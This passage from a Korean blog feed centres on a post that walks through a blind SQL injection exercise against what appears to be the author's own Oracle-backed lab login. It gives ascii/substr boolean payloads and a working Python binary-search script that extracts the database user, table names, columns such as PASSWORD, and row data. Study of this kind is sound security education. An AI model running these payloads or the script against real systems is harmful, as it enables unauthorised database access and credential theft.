  <li><a href="https://github.com/MinGyu2/myWeb">MinGyu2/myWeb (github.com)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="웹" /><category term="jsp" /><category term="servlet" /><summary type="html"><![CDATA[게시글에 페이징 번호를 추가하자.]]></summary></entry><entry><title type="html">Blind SQL Injection 실습</title><link href="http://localhost:4000/BlindSQLi%EC%8B%A4%EC%8A%B5/" rel="alternate" type="text/html" title="Blind SQL Injection 실습" /><published>2023-05-12T00:00:00+09:00</published><updated>2023-05-12T23:13:00+09:00</updated><id>http://localhost:4000/BlindSQLi%EC%8B%A4%EC%8A%B5</id><content type="html" xml:base="http://localhost:4000/BlindSQLi%EC%8B%A4%EC%8A%B5/"><![CDATA[<h2 id="실습-환경">실습 환경</h2>
<ul>
  <li>오라클 DB</li>
</ul>

<h2 id="서버-인증-질의문-예측하기">서버 인증 질의문 예측하기</h2>

<ul>
  <li>인증과 식별을 따로 분리하여 검사한다.</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="n">id</span><span class="p">,</span><span class="n">pwd</span> <span class="k">from</span> <span class="n">xxx</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'xx'</span><span class="p">;</span>
</code></pre></div></div>

<h2 id="참과-거짓-화면">참과 거짓 화면</h2>
<ul>
  <li>로그인 성공 실패 여부로 참과 거짓을 구분할 수 있다.</li>
</ul>

<h3 id="참">참</h3>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">입력</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
</code></pre></div></div>

<ul>
  <li>로그인 성공<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/57c7f54d-5fef-454e-9060-047ac800766a" alt="Pasted image 20230511135315" /></li>
</ul>

<h3 id="거짓">거짓</h3>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">입력</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
</code></pre></div></div>

<ul>
  <li>로그인 실패<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/310a130f-2f28-444b-b75d-3692cc977cfd" alt="Pasted image 20230511135242" /></li>
</ul>

<h2 id="select-문-사용-가능-확인">select 문 사용 가능 확인</h2>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">입력</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="s1">'test'</span><span class="p">)</span><span class="o">=</span><span class="s1">'test'</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
<span class="err">성공</span>

<span class="k">select</span> <span class="s1">'test'</span> <span class="k">from</span> <span class="n">dual</span>
<span class="err">입력</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="k">select</span> <span class="s1">'test'</span> <span class="k">from</span> <span class="n">dual</span><span class="p">)</span><span class="o">=</span><span class="s1">'test'</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
<span class="err">성공</span>
</code></pre></div></div>

<ul>
  <li>로그인 성공. select 문을 사용할 수 있다.</li>
</ul>

<h2 id="공격-포맷-만들기">공격 포맷 만들기.</h2>
<ul>
  <li>Blind SQL Injection 은 한 문자씩 확인하는 공격이다.</li>
  <li>ascii 와 substr 함수를 이용할 것 이다.</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">입력</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="s1">'t'</span><span class="p">)</span><span class="o">=</span><span class="s1">'t'</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
<span class="err">성공</span>

<span class="n">ascii</span> <span class="err">함수를</span> <span class="err">문자를</span> <span class="err">이용하여</span> <span class="err">아스키코드로</span> <span class="err">변환한다</span><span class="p">.</span>
<span class="n">ascii</span><span class="p">(</span><span class="s1">'t'</span><span class="p">)</span>
<span class="err">입력</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="s1">'t'</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
<span class="err">성공</span>

<span class="s1">'t'</span> <span class="err">한</span> <span class="err">문자</span> <span class="err">추출하기</span><span class="p">.</span>
<span class="n">substr</span><span class="p">(</span><span class="s1">'test'</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
<span class="err">입력</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="s1">'test'</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
<span class="err">성공</span>

<span class="err">공격문</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">SQL</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>

<span class="s1">'test'</span> <span class="err">출력하기</span><span class="p">.</span>
<span class="k">select</span> <span class="s1">'test'</span> <span class="k">from</span> <span class="n">dual</span><span class="p">;</span>
<span class="err">공격문</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span> <span class="s1">'test'</span> <span class="k">from</span> <span class="n">dual</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
<span class="err">성공</span>
</code></pre></div></div>

<ul>
  <li>완성된 공격 포맷</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">공격</span> <span class="err">포맷</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">SQL</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
</code></pre></div></div>

<h2 id="base가-되는-파이썬-코드">Base가 되는 파이썬 코드</h2>
<ul>
  <li>인자로 쿼리문을 삽입해 주면 된다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">FAIL_LEN</span> <span class="o">=</span> <span class="mi">1482</span><span class="p">;</span>
<span class="n">URL</span> <span class="o">=</span> <span class="s">"http://221.27.0.6/main_page/sql_injection_prob/login_methods/division_blind_sql_injection/authentication"</span>
<span class="n">COOKIES</span> <span class="o">=</span> <span class="p">{</span><span class="s">'JSESSIONID'</span><span class="p">:</span><span class="s">'E092AC001C0A642C200BD6902B7EF6A5'</span><span class="p">}</span>
<span class="n">DATA</span><span class="o">=</span><span class="p">{</span><span class="s">'user_name'</span><span class="p">:</span><span class="s">'user2'</span><span class="p">,</span> <span class="s">'user_password'</span><span class="p">:</span><span class="s">'2222'</span><span class="p">}</span>

<span class="k">def</span> <span class="nf">is_success</span><span class="p">()</span><span class="o">-&gt;</span><span class="nb">bool</span><span class="p">:</span>
<span class="err"> </span> <span class="err"> </span> <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span> <span class="o">=</span> <span class="n">URL</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span> <span class="n">COOKIES</span><span class="p">,</span><span class="n">data</span><span class="o">=</span> <span class="n">DATA</span><span class="p">)</span>
<span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="nf">len</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)</span> <span class="o">!=</span> <span class="n">FAIL_LEN</span><span class="p">;</span>
  
<span class="k">def</span> <span class="nf">find_data</span><span class="p">(</span><span class="n">query</span><span class="p">):</span>
<span class="err"> </span> <span class="err"> </span> <span class="n">row</span> <span class="o">=</span> <span class="mi">0</span>
<span class="err"> </span> <span class="err"> </span> <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">#
</span><span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">DATA</span><span class="p">[</span><span class="s">'user_name'</span><span class="p">]</span> <span class="o">=</span> <span class="nf">attack_query</span><span class="p">(</span><span class="n">query</span><span class="p">,</span><span class="n">row</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span> <span class="ow">not</span> <span class="nf">is_success</span><span class="p">()</span> <span class="p">:</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">break</span><span class="p">;</span>
  
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">point</span> <span class="o">=</span> <span class="mi">1</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">#
</span><span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">DATA</span><span class="p">[</span><span class="s">'user_name'</span><span class="p">]</span> <span class="o">=</span> <span class="nf">attack_query</span><span class="p">(</span><span class="n">query</span><span class="p">,</span><span class="n">row</span><span class="p">,</span><span class="n">point</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span> <span class="ow">not</span> <span class="nf">is_success</span><span class="p">():</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">break</span><span class="p">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1"># 이분 탐색
</span><span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">s</span> <span class="o">=</span> <span class="mi">32</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">e</span> <span class="o">=</span> <span class="mi">126</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">while</span> <span class="n">s</span> <span class="o">&lt;</span> <span class="n">e</span><span class="p">:</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">m</span> <span class="o">=</span> <span class="p">(</span><span class="n">s</span><span class="o">+</span><span class="n">e</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">DATA</span><span class="p">[</span><span class="s">'user_name'</span><span class="p">]</span> <span class="o">=</span> <span class="nf">attack_query</span><span class="p">(</span><span class="n">query</span><span class="p">,</span><span class="n">row</span><span class="p">,</span><span class="n">point</span><span class="p">,</span><span class="n">m</span><span class="p">)</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span> <span class="nf">is_success</span><span class="p">()</span> <span class="p">:</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">s</span> <span class="o">=</span> <span class="n">m</span><span class="o">+</span><span class="mi">1</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">else</span><span class="p">:</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">e</span> <span class="o">=</span> <span class="n">m</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">#
</span><span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">print</span><span class="p">(</span><span class="nf">chr</span><span class="p">(</span><span class="n">s</span><span class="p">),</span><span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">,</span><span class="n">flush</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">point</span> <span class="o">+=</span><span class="mi">1</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">print</span><span class="p">()</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">#
</span><span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">row</span><span class="o">+=</span><span class="mi">1</span>
<span class="err"> </span> <span class="err"> </span> <span class="k">return</span>
<span class="c1"># sql 질의문
# row 0 부터 시작
# point 1 부터 시작
# ascii
</span><span class="k">def</span> <span class="nf">attack_query</span><span class="p">(</span><span class="n">sql</span><span class="p">,</span> <span class="n">row</span><span class="p">,</span> <span class="n">point</span><span class="p">,</span> <span class="nb">ascii</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span> <span class="p">:</span>
<span class="err"> </span> <span class="err"> </span> <span class="n">attack_query</span> <span class="o">=</span> <span class="p">(</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="s">"user2' and ((ascii(substr(("</span><span class="p">,</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">sql</span><span class="p">,</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="s">" OFFSET "</span><span class="p">,</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">str</span><span class="p">(</span><span class="n">row</span><span class="p">),</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="s">" ROWS FETCH NEXT 1 ROWS ONLY),"</span><span class="p">,</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">str</span><span class="p">(</span><span class="n">point</span><span class="p">),</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="s">",1)))&gt;"</span><span class="p">,</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">str</span><span class="p">(</span><span class="nb">ascii</span><span class="p">),</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="s">") and '1'='1"</span>
<span class="err"> </span> <span class="err"> </span> <span class="p">)</span>
<span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">attack_query</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="사용자-명-추출-하기">사용자 명 추출 하기.</h2>
<ul>
  <li>현재 사용중인 사용자 명을 출력한다.</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">user</span> <span class="k">from</span> <span class="n">dual</span><span class="p">;</span>
<span class="err">공격</span> <span class="err">포맷</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span> <span class="k">user</span> <span class="k">from</span> <span class="n">dual</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
<span class="err">성공</span>

<span class="err">한</span> <span class="err">문자씩</span> <span class="err">찾아주면</span> <span class="err">된다</span><span class="p">.</span>
</code></pre></div></div>

<ul>
  <li>파이썬 코드로 빠르게 사용자 명 찾기.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">find_current_user_name</span><span class="p">():</span>
<span class="err"> </span> <span class="err"> </span> <span class="n">query</span> <span class="o">=</span> <span class="s">"select user from dual"</span>
<span class="err"> </span> <span class="err"> </span> <span class="nf">find_data</span><span class="p">(</span><span class="n">query</span><span class="o">=</span> <span class="n">query</span><span class="p">)</span>
<span class="err"> </span> <span class="err"> </span> <span class="k">return</span>
</code></pre></div></div>

<ul>
  <li>추출한 데이터.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C##DBFORPROB
</code></pre></div></div>

<h2 id="테이블-명-추출하기">테이블 명 추출하기.</h2>
<ul>
  <li>현재 존재하는 테이블 명들을 추출해 보자.</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">table_name</span> <span class="k">from</span> <span class="n">all_tables</span> <span class="k">where</span> <span class="k">owner</span><span class="o">=</span><span class="s1">'C##DBFORPROB'</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">;</span>
<span class="err">또는</span> 
<span class="k">select</span> <span class="n">tname</span> <span class="k">from</span> <span class="n">tab</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">;</span>

<span class="err">공격</span> <span class="err">포맷</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span> <span class="k">table_name</span> <span class="k">from</span> <span class="n">all_tables</span> <span class="k">where</span> <span class="k">owner</span><span class="o">=</span><span class="s1">'C##DBFORPROB'</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>

<span class="err">공격</span> <span class="err">포맷</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span> <span class="n">tname</span> <span class="k">from</span> <span class="n">tab</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>

<span class="err">더</span> <span class="err">짧은</span> <span class="mi">2</span><span class="err">번째</span> <span class="err">공격</span> <span class="err">포맷을</span> <span class="err">이용하였다</span><span class="p">.</span>
</code></pre></div></div>

<ul>
  <li>파이썬 코드로 빠르게 테이블 명 찾기.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">find_table_name</span><span class="p">():</span>
<span class="err"> </span> <span class="err"> </span> <span class="n">query</span> <span class="o">=</span> <span class="s">"select tname from tab"</span>
<span class="err"> </span> <span class="err"> </span> <span class="nf">find_data</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
<span class="err"> </span> <span class="err"> </span> <span class="k">return</span>
</code></pre></div></div>

<ul>
  <li>추출한 데이터.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MEMBERS
TEST
</code></pre></div></div>

<h2 id="컬럼-명-추출하기">컬럼 명 추출하기.</h2>
<ul>
  <li>테이블의 컬럼명을 추출하기.</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">column_name</span> <span class="k">from</span> <span class="n">cols</span> <span class="k">where</span> <span class="k">table_name</span><span class="o">=</span><span class="s1">'MEMBERS'</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">;</span>
<span class="k">select</span> <span class="k">column_name</span> <span class="k">from</span> <span class="n">cols</span> <span class="k">where</span> <span class="k">table_name</span><span class="o">=</span><span class="s1">'TEST'</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">;</span>

<span class="err">공격</span> <span class="err">포맷</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span> <span class="k">column_name</span> <span class="k">from</span> <span class="n">cols</span> <span class="k">where</span> <span class="k">table_name</span><span class="o">=</span><span class="s1">'MEMBERS'</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
</code></pre></div></div>

<ul>
  <li>파이썬 코드로 빠르게 컬럼 명 찾기.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">find_column_name</span><span class="p">(</span><span class="n">table_name</span><span class="p">):</span>
<span class="err"> </span> <span class="err"> </span> <span class="n">query</span> <span class="o">=</span> <span class="s">"select column_name from cols where table_name='"</span><span class="o">+</span><span class="n">table_name</span><span class="o">+</span><span class="s">"'"</span>
<span class="err"> </span> <span class="err"> </span> <span class="nf">find_data</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
<span class="err"> </span> <span class="err"> </span> <span class="k">return</span>
</code></pre></div></div>

<ul>
  <li>추출한 데이터.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MEMBERS 컬럼이름
SID
ID
PASSWORD
EMAIL
INFO
HASHPWD

TEST 컬럼이름
MSG
</code></pre></div></div>

<h2 id="데이터-추출하기">데이터 추출하기</h2>
<ul>
  <li>테이블에  저장되어 있는 데이터 추출하기.</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="err">컬럼이름</span> <span class="k">from</span> <span class="err">테이블명</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">;</span>

<span class="k">select</span> <span class="n">MSG</span> <span class="k">from</span> <span class="n">TEST</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">;</span>

<span class="err">공격</span> <span class="err">포맷</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span> <span class="n">MSG</span> <span class="k">from</span> <span class="n">TEST</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
</code></pre></div></div>

<ul>
  <li>파이썬 코드로 빠르게 데이터 추출하기.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">find_table_data</span><span class="p">(</span><span class="n">column</span><span class="p">,</span> <span class="n">table_name</span><span class="p">):</span>
<span class="err"> </span> <span class="err"> </span> <span class="n">query</span> <span class="o">=</span> <span class="s">"select "</span><span class="o">+</span><span class="n">column</span><span class="o">+</span><span class="s">" from "</span><span class="o">+</span><span class="n">table_name</span>
<span class="err"> </span> <span class="err"> </span> <span class="nf">find_data</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
<span class="err"> </span> <span class="err"> </span> <span class="k">return</span>
</code></pre></div></div>

<ul>
  <li>추출한 데이터.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MEMBERS 데이터 추출
root
dad
user123
user2

TEST 데이터 추출
blind sql injection success
</code></pre></div></div>

<h2 id="결과">결과</h2>
<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/2b4957ca-e70d-4f4b-bd3e-01a45970eaaa" alt="Pasted image 20230512003709" /></p>

<h2 id="전체-코드">전체 코드</h2>
<script src="https://gist.github.com/MinGyu2/ed9926c11854380ea75abef3fbdfa4e5.js"></script>]]></content><author><name>Jung MinGyu</name></author><category term="Oracle DB" /><category term="Blind SQLi" /><category term="SQLi" /><category term="웹 해킹" /><summary type="html"><![CDATA[직접 Blind SQL Injection 을 시도해보자.]]></summary></entry><entry><title type="html">웹서버 만들기(11) 게시글 수정, 삭제, 검색</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C11%EA%B2%8C%EC%8B%9C%EA%B8%80/" rel="alternate" type="text/html" title="웹서버 만들기(11) 게시글 수정, 삭제, 검색" /><published>2023-05-10T00:00:00+09:00</published><updated>2023-05-10T23:13:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C11%EA%B2%8C%EC%8B%9C%EA%B8%80</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C11%EA%B2%8C%EC%8B%9C%EA%B8%80/"><![CDATA[<h2 id="게시글-수정">게시글 수정</h2>
<ul>
  <li>자기가 쓴 글만 수정이 가능하다.</li>
  <li><code class="language-plaintext highlighter-rouge">수정하기</code>버튼을 클릭하면 게시글 수정 페이지가 나타난다.</li>
  <li><code class="language-plaintext highlighter-rouge">수정하기</code>버튼은 자기가 쓴 게시글에만 표시가 된다.</li>
</ul>

